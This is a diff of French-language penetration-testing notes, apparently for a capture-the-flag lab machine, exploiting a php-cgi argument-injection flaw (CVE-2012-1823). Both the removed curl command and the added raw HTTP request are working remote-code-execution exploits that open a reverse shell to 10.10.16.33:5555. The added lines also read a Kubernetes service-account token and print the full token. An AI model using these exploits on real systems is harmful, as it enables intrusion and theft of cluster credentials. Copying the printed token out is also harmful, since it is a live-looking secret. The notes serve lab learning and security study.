@@ -42,12 +42,26 @@ On utilise nikto pour footprinter les siteweb:
 ![[IMG-20260118160714840.png]]
 
 /cgi-bin/php-cgi
+[HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/cgi.html#old-php--cgi--rce-cve-2012-1823-cve-2012-2311)
+
+
+![[IMG-20260119004545787.png]]
+
 
 ```
-curl -i -X POST \
-"http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input=php://input" \
---data-binary "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.16.33/5555 0>&1\"'); ?>"
+POST /cgi-bin/php-cgi?-d+disable_functions=+-d+auto_prepend_file=php://input HTTP/1.1
+Host: 10.43.2.241:5000
+Content-Type: text/plain
+Content-Length: 77
 
+
+php -r '$sock=fsockopen("10.10.16.33",5555);shell_exec("sh <&3 >&3 2>&3");'
 ```
 
 
+![[IMG-20260119004711181.png]]
+
+```
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0JqMlJYWjAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODAwMzE1MzcyLCJpYXQiOjE3Njg3NzkzNzIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiOWM5NTc0YTctOGJkYS00ZjlmLWJkNDQtZWJkMzYyOTA0MGFhIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwibm9kZSI6eyJuYW1lIjoiZ2l2ZWJhY2suaHRiIiwidWlkIjoiMTJhOGE5Y2YtYzM1Yi00MWYzLWIzNWEtNDJjMjYyZTQzMDQ2In0sInBvZCI6eyJuYW1lIjoibGVnYWN5LWludHJhbmV0LWNtcy02ZjdiZjVkYjg0LXpjeDg4IiwidWlkIjoiNjEyYmJmZjMtOTQ3NS00ZGVmLTg2MjQtNTI1ODI4MzAwNDAzIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJzZWNyZXQtcmVhZGVyLXNhIiwidWlkIjoiNzJjM2YwYTUtOWIwOC00MzhhLWEzMDctYjYwODc0NjM1YTlhIn0sIndhcm5hZnRlciI6MTc2ODc4Mjk3OX0sIm5iZiI6MTc2ODc3OTM3Miwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6c2VjcmV0LXJlYWRlci1zYSJ9.Nmw2ZkkE1MxdQTtK0eNd57mdElmVnNTTG8A8J5LVPqGtVvcP75Fbsna4oNFofhrIN3ljOKLBVYClQ4yImQuPUZswAXMcQKJtgHvHoZswv0LJLMs9ST8Pp2-lMRjR0uFO0WWpLMNELIWxHXnAEbXMPFq-nc0TQcB9L0Tz-E8sWvKlCyuY2D4CIZx2HDEBkUs6Am5xMvmJKCoQn7nc5C-M5lJGpQhBtlA7eD1BhDBLM7OIXT2lMs1RuhOldTHpr0QPTH6ttIO01oRypajdSh9zUHGtiWOQBP2V4MVIL-M7nSqfS4wnCJVPFEypaegBlQ-HMcjISduo6E6X6bYGev_RNg
+```
